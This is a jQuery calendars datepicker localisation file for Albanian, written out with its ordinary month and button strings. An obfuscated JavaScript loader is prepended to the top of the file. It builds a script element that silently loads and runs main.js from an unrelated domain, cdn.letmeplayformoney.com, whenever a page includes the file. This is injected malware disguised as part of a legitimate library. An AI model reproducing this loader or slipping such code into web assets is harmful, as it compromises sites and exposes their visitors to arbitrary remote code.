var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Albanian localisation for calendars datepicker for jQuery.
   Written by Flakron Bytyqi (flakron@gmail.com). */
(function($) {
	$.calendars.picker.regional['sq'] = {
		renderer: $.calendars.picker.defaultRenderer,
		prevText: '&#x3c;mbrapa', prevStatus: 'trego muajin e fundit',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '',
		nextText: 'Përpara&#x3e;', nextStatus: 'trego muajin tjetër',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '',
		currentText: 'sot', currentStatus: '',
		todayText: 'sot', todayStatus: '',
		clearText: 'fshije', clearStatus: 'fshije datën aktuale',
		closeText: 'mbylle', closeStatus: 'mbylle pa ndryshime',
		yearStatus: 'trego tjetër vit', monthStatus: 'trego muajin tjetër',
		weekText: 'Ja', weekStatus: 'Java e muajit',
		dayStatus: '\'Zgjedh\' D, M d', defaultStatus: 'Zgjedhe një datë',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['sq']);
})(jQuery);
